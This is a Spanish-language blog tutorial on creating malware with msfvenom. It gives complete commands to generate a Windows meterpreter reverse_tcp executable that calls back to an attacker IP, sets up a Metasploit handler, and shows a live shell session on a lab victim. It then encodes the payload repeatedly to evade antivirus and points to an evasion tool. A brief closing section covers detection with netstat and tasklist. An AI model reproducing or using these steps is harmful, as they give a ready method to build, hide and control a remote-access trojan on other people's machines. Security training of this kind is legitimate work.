---
date: 2022-04-27T22:40:05.000Z
layout: post
comments: true
title: Creación de malware
subtitle: 'por medio de msfvenom'
description: >-
image: >-
    http://imgfz.com/i/kAO6vGe.png
optimized_image: >-
  http://imgfz.com/i/kAO6vGe.png
category: ciberseguridad
tags:
  - reverse
  - malware
  - troyano
  - msfvenom
  - handler
  - metasploit
  - meterpreter
  - explotación
  - linux
  - hacking
author: Felipe Canales Cayuqueo
paginate: true
---

### Msfvenom

Es un generador de carga útil independiente. Es una combinación de Msfpayload y Msfencode. Es rápido y utiliza una sola instancia. También tiene opciones de línea de comando estandarizadas. Puede generar cargas útiles para tantas plataformas como Cisco, Android, OSX, BSD, Solaris, Firefox, Windows, Unix, Nodejs y mucho más.

Para empezar creamos un ejecutable malicioso, el cual por defecto será para arquitecturas x32. Para asignar x64 se debe asignar windows/x64/meterpreter/reverse_tcp.

```bash
┌─[root@kali]─[/home/user/malware]
└──╼ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.1.1.19 lport=9999 -f exe -o poc.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: poc.exe
```

Parámetros usados:

| Parámetro | Utilidad |
| :--------: | :-------: |
| -p | Se carga el payload. |
| lhost | La dirección IP de la máquina atacante. |
| lport | El puerto que se usará para ejecutar el malware. |
| -f | Se selecciona el tipo de archivo que queremos. |
| -o | Se le asigna un nombre. |

El ejecutable lo trasladamos a la máquina victima:

![1](http://imgfz.com/i/MXWNr4G.png)

Ahora procedemos a ponernos a la escucha:

```bash
msf6 > use exploit/multi/handler
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

msf6 exploit(multi/handler) > set LHOST 10.1.1.19
LHOST => 10.1.1.19
msf6 exploit(multi/handler) > set LPORT 9999
LPORT => 9999
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.1.1.19:9999 
```
Ahora ejecutamos el troyano en la máquina victima:

![2](http://imgfz.com/i/IxQi5sr.png)

Se recibe y crea la sesión en nuestra máquina:

```
[*] Sending stage (175174 bytes) to 10.1.1.5
[*] Meterpreter session 1 opened (10.1.1.19:9999 -> 10.1.1.5:1204 ) at 2022-04-27 19:46:16 -0400

meterpreter > shell
Process 356 created.
Channel 1 created.
Microsoft Windows [Versi�n 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos.

C:\Users\Demo\Desktop>whoami
whoami
demo-pc\demo

C:\Users\Demo\Desktop>ipconfig
ipconfig

Configuraci�n IP de Windows


Adaptador de Ethernet Conexi�n de �rea local:

   Sufijo DNS espec�fico para la conexi�n. . : 
   Direcci�n IPv6 . . . . . . . . . . : fd17:625c:f037:101:38fa:7c31:76d4:8fb7
   Direcci�n IPv6 temporal. . . . . . : fd17:625c:f037:101:d4c7:ff3e:dc1b:b81b
   V�nculo: direcci�n IPv6 local. . . : fe80::38fa:7c31:76d4:8fb7%11
   Direcci�n IPv4. . . . . . . . . . . . . . : 10.1.1.5
   M�scara de subred . . . . . . . . . . . . : 255.255.255.0
   Puerta de enlace predeterminada . . . . . : fe80::5054:ff:fe12:3500%11
                                       10.1.1.1

Adaptador de t�nel isatap.{013659A2-A2D8-4DE0-AF04-BB55011CFF79}:

   Estado de los medios. . . . . . . . . . . : medios desconectados
   Sufijo DNS espec�fico para la conexi�n. . : 

C:\Users\Demo\Desktop>dir
dir
 El volumen de la unidad C no tiene etiqueta.
 El n�mero de serie del volumen es: 4479-B434

 Directorio de C:\Users\Demo\Desktop

27-04-2022  20:44    <DIR>          .
27-04-2022  20:44    <DIR>          ..
17-03-2021  04:06               925 Nmap - Zenmap GUI.lnk
27-04-2022  20:38            73.802 poc.exe
               2 archivos         74.727 bytes
               2 dirs  20.974.960.640 bytes libres
```

### Codificar malware

Esto sirve para intentar ocultar el malware y que este no sea detectado dentro del sistema:

```
┌─[root@kali]─[/home/user/malware]
└──╼ msfvenom -p windows/meterpreter/reverse_tcp -i 10 -e x86/shikata_ga_nai lhost=10.1.1.19 lport=9999 -f exe -o poc2.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai succeeded with size 408 (iteration=1)
x86/shikata_ga_nai succeeded with size 435 (iteration=2)
x86/shikata_ga_nai succeeded with size 462 (iteration=3)
x86/shikata_ga_nai succeeded with size 489 (iteration=4)
x86/shikata_ga_nai succeeded with size 516 (iteration=5)
x86/shikata_ga_nai succeeded with size 543 (iteration=6)
x86/shikata_ga_nai succeeded with size 570 (iteration=7)
x86/shikata_ga_nai succeeded with size 597 (iteration=8)
x86/shikata_ga_nai succeeded with size 624 (iteration=9)
x86/shikata_ga_nai chosen with final size 624
Payload size: 624 bytes
Final size of exe file: 73802 bytes
Saved as: poc2.exe
```
Parámetros usados:

| Parámetro | Utilidad |
| :--------: | :-------: |
| -i | Cantidad de veces que se va a codificar. |
| -e | Se selecciona el tipo de codificador. |

Para ver la lista de codificadores que contiene msfvenom de deber realizar lo siguiente:

```
┌─[root@kali]─[/home/user/malware]
└──╼ msfvenom -l encoders
```

>Otra forma recomendada para evitar que sea detectado el malware es por medio de la herramienta [Phantom-Evasion](https://github.com/oddcod3/Phantom-Evasion).


### Forense

Ahora desde el lado de la víctima ¿cómo se descubre que se está ejecutando un proceso como este?. La respuesta es a través de dos comandos, iniciando por ```netstat```:

![3](http://imgfz.com/i/jCP63Yc.png)

Se identifica un puerto extraño. Ahora a través de ```tasklist``` y con el PID que en este caso es 1004, podremos descubrir cual es el troyano en ejecución:

![4](http://imgfz.com/i/UyWCaxj.png)

Si seguimos bajando lo podremos detectar:

![5](http://imgfz.com/i/TQVYPH2.png)
